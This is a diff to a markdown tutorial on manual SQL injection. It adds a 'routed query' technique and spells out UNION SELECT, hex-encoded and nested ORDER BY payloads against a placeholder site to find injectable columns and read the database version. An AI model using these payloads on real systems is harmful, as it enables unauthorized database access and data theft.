@@ -65,12 +65,25 @@
    - https://website.com/product/id?=23' UNION ALL SELECT NULL,NULL,NULL--
 - now, in the case of `https://website.com/product/id?=23' UNION SELECT 1,2,3--`, you'll see a numbers been reflacted on the website. ex. 2,3. So, columns 2 & 3 is vulnerable.
 - in case of NULL, we've to replace NULL by adding strings in each NULL value to get the vulnerable columns.
-- example.
+- example,
   - https://website.com/product/id?=23' UNION SELECT 'findVulClmn',NULL,NULL-- See, if `findVulClmn` been reflacted on website or not. if yes, then, congratulations, we've found vulnerable columns.
   - if not, go ahead and try, https://website.com/product/id?=23' UNION SELECT NULL, 'findVulClmn',NULL--.
   - try until you find some string being reflacted on website.
 
-5. Exploit. (get the data from database).
+- **What if we didn't see any numbers been reflacted on website?**
+ - So, in that case, we've to try other methods. such as, routed query, etc.
+   - ***Routed Query***
+     - So, in routed query injection technique, we do something like this,
+       1. https://website.com/product/id?=23' UNION SELECT 1',2,3--
+       2. https://website.com/product/id?=23' UNION SELECT 0x3127,2,3-- (**here 1' is 0xHEX-'0x3127' encoded.**)
+         - now, put **0xHEX** encoded value on each column one after one and see the results. If, web page gets redirected or gets error or something strange happens in/on web page, then, assume that we can put our **routed query** in that column.
+           - example,
+             - if we get errors on 2nd column, (i.e. https://website.com/product/id?=23' UNION SELECT 1,0x3127,3--) then, we can perform our injection on that column like this,
+             1. *Get the total number of columns:* https://website.com/product/id?=23' UNION SELECT 1,2' ORDER BY 10--,3-- ***(0xHEX the ORDER BY 10--)***
+             2. *Get the vulnerable column:* https://website.com/product/id?=23' UNION SELECT 1,2' UNION SELECT 1,2,3,4,5--,3-- ***(0xHEX the query)***
+             3. now, you got the point. 🙂
+
+### 5) Exploit. (get the data from database).
 - So, after getting vulnerable columns, we can get the data from database by using various payloads.
 - example : https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL-- to get the database version.
 
